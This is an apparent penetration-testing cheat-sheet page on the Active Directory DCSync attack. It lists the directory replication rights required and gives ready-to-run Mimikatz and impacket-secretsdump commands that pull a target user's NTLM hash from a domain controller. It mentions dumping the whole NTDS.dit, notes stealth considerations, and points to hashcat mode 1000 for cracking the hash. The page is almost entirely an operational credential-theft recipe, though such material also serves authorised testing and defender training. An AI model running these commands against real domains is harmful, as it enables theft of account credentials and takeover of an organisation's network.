---
layout: default
title: DCSync Attack
parent: Active Directory
nav_order: 5
permalink: /ad/dcsynk/
---

# DCSync Attack
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Prerequisites

- Domain account with *Replicating Directory Changes*, *Replicating Directory Changes All*, and Re*plicating Directory Changes in Filtered Set* rights. By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned.

## Exploit

To obtain the NTLM hash of a single targeted user using a DCSync attack. You can also get the entire NTDS.dit, but it's less stealthy.

```bash
# From a domain joined Windows computer, with Mimikatz
lsadump::dcsync /user:$DOMAIN\$TARGET

# From Kali
impacket-secretsdump -just-dc-user $TARGET $DOMAIN/$USERNAME:$PASSWORD@$DC_IP
```

Once you get the NTLM hash of your target user, you can user `hashcat -m 1000` to crack it.